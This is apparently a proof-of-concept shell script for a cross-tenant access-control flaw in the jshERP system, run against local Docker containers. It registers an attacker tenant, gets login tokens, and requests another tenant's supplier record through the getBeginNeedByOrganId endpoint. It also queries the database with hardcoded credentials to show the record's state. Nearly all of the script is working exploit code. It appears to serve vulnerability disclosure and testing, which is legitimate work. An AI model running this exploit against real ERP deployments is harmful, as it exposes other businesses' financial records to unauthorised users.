#!/bin/sh
set -e
BASE='http://127.0.0.1:9999/jshERP-boot'
P='e10adc3949ba59abbe56e057f20f883e'
ORGAN_ID=74
ATTACKER="pocx$(date +%s)"

login_token() {
  user="$1"
  docker exec jsherp33-app sh -lc "curl -s -X POST $BASE/user/login -H 'Content-Type: application/json' -d '{\"loginName\":\"$user\",\"password\":\"$P\"}'" \
  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
}

step() {
  echo
  echo "=============================="
  echo "[STEP] $1"
  echo "=============================="
}

run() {
  echo "+ $1"
  sh -c "$1"
}

step "1) 查看目标供应商记录（数据库状态）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=$ORGAN_ID;\\\"\""

step "2) 创建跨租户攻击账号（自动注册新租户）"
REG_PAYLOAD="{\"loginName\":\"$ATTACKER\",\"password\":\"$P\"}"
echo "attacker login_name: $ATTACKER"
echo "+ docker exec -i jsherp33-app sh -lc \"curl -s -X POST '$BASE/user/registerUser' -H 'Content-Type: application/json' --data-binary @-\""
REG_RESP="$(printf '%s' "$REG_PAYLOAD" | docker exec -i jsherp33-app sh -lc "curl -s -X POST '$BASE/user/registerUser' -H 'Content-Type: application/json' --data-binary @-")"
echo "register response: $REG_RESP"
echo "$REG_RESP" | grep -q '"code":200' || {
  echo "[-] 注册攻击账号失败，停止本 PoC"
  exit 1
}

step "3) 查看攻击账号对应的用户与租户（数据库状态）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,login_name,tenant_id,ismanager,status FROM jsh_user WHERE login_name='$ATTACKER'; SELECT tenant_id,login_name,user_num_limit,expire_time FROM jsh_tenant WHERE login_name='$ATTACKER';\\\"\""

step "4) 登录获取 jsh 与攻击者 token"
TOKEN_JSH="$(login_token jsh)"
TOKEN_ATTACK="$(login_token $ATTACKER)"
echo "jsh token: $TOKEN_JSH"
echo "attacker token: $TOKEN_ATTACK"
[ -n "$TOKEN_JSH" ] || { echo "[-] jsh 登录失败，停止"; exit 1; }
[ -n "$TOKEN_ATTACK" ] || { echo "[-] attacker 登录失败，停止"; exit 1; }

step "5) 基线请求：租户 owner(jsh) 读取该 organId"
run "docker exec jsherp33-app sh -lc \"curl -s '$BASE/supplier/getBeginNeedByOrganId?organId=$ORGAN_ID' -H 'X-Access-Token: $TOKEN_JSH'\""

step "6) 攻击请求：跨租户攻击者读取同一个 organId"
run "docker exec jsherp33-app sh -lc \"curl -s '$BASE/supplier/getBeginNeedByOrganId?organId=$ORGAN_ID' -H 'X-Access-Token: $TOKEN_ATTACK'\""

step "7) 调用后再次查看目标供应商记录（数据库状态）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=$ORGAN_ID;\\\"\""

echo
echo "[Context]"
echo "jsh token: $TOKEN_JSH"
echo "attacker token: $TOKEN_ATTACK"
echo "attacker login: $ATTACKER"
